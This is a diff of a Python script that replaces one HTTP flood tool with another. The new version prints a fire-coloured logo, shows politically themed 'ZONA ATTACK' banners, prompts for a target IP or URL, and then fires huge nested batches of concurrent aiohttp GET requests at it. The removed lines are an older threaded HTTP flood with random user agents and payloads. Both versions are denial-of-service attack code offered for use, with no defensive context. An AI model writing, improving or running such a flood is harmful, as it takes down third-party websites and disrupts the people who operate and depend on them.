@@ -1,67 +1,73 @@
-# -*- coding: utf-8 -*-
-# CHECK IMPORT
-try:
-    import socket
-    import threading
-    import string
-    import random
-    import time
-    import os
-    import platform
-    import sys
-    import fade
-    from colorama import Fade
+import socket
+import time
+import asyncio
+import aiohttp
+import fade
+import os
+# Clear command prompt based on the operating system
+if os.name == "nt":  # Windows
+    os.system("cls")
+else:  # Unix/Linux/Mac
+    os.system("clear")
+
+logo = """
+
+       ±± ±± ±±      ±± ±± ±±                      ±±±             
+       ±±       ±±   ±±       ±±                 ±± ±±             
+       ±±       ±±   ±±       ±±                    ±±             
+       ±±       ±±   ±±       ±±                    ±±             
+       ±± ±± ±±      ±± ±± ±±        ________       ±±             
+       ±±   ±±       ±±   ±±         ±± ±± ±±       ±±             
+       ±±     ±±     ±±     ±±                      ±±             
+       ±±       ±±   ±±       ±±                 ±± ±± ±±  
+    
+++ _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—      
+||                                                                   
+||                                                                 
+||                                            
+||                                               
+||_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_
+"""
+faded_text = fade.fire(logo)
+print(faded_text)
+socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ask = fade.pinkred("Enter the target IP/URL:")
+url = input(ask)
+time.sleep(5),
+print("\033[96m                  ⟩⟩  WELCOME \033[0m "),
+time.sleep(5),
+print("\033[92m                  ⟩⟩  TO ZONA ATTACK \033[0m "),
+time.sleep(5),
+print("\033[1m                  ⟩⟩  DON'T STOP FIGHT \033[0m "),
+time.sleep(5),
+print("\033[97m                  ⟩⟩  BECAUSE OF PALESTINE \033[0m "),
+time.sleep(5),
+print("\033[95m                  ⟩⟩  STILL BURNING \033[0m "),
+time.sleep(5),
+
+async def increment_view_count(session):
+    try:
+        async with session.get(url) as response:
+            if response.status == 200:
+                print("PINGED THIS SHI!")
+            else:
+                print("Failed ping.")
+    except aiohttp.ClientError as e:
+        print("An error occurred:", e)
+
+async def main():
+    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        for _ in range(19999):  # Increase the number of concurrent requests
+            task = asyncio.create_task(increment_view_count(session))
+            tasks.append(task)
+            for i in range(19999):  # Increase the number of concurrent requests
+                task = asyncio.create_task(increment_view_count(session))
+                tasks.append(task)
+            await asyncio.gather(*tasks)
+        await asyncio.gather(*tasks)
 
 
-os.system("clear")
-logo =  """
-        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @
-        @         @  @      @         @   @        @     @
-        @         @  @       @       @   @         @   @
-        @ @ @ @ @    @        @     @    @         @ @
-        @         @  @         @   @     @         @   @   
-        @         @  @          @ @       @        @     @
-        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @
-       """
-
-def HTTP_ATTACK(threads, attack_time, target):
-	# Finish
-	global FINISH
-	FINISH = False
-
-	if ipTools.isCloudFlare(target):
-		print("\033[1;33m"+"[!]"+"\033[0m"+" This site is under CloudFlare protection.")
-		if input("\033[1;77m"+"[?]"+"\033[0m"+" Continue HTTP attack? (y/n): ").strip(" ").lower() != "y":
-			exit()
-
-	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting HTTP attack...")
-	
-	threads_list = []
-	# Load 25 random user agents
-	user_agents = []
-	for _ in range(threads):
-		user_agents.append( randomData.random_useragent() )
-
-
-	# HTTP flood
-	def http_flood():
-		global FINISH
-		while True:
-			if FINISH:
-				break
-			payload = str(random._urandom(random.randint(1, 30)))
-			headers = {
-				"X-Requested-With": "XMLHttpRequest",
-				"Connection": "keep-alive",
-				"Pragma": "no-cache",
-				"Cache-Control": "no-cache",
-				"Accept-Encoding": "gzip, deflate, br",
-				"User-agent": random.choice(user_agents)
-			}
-			try:
-				r = requests.get(target, params = payload)
-			except Exception as e:
-				print(e)
-				time.sleep(2)
-			else:
-				print("\033[1;32m"+"[+]"+"\033[0m"+" HTTP packet with size " + str(len(payload)) + " was sent!")
+if __name__ == "__main__":
+    asyncio.run(main())
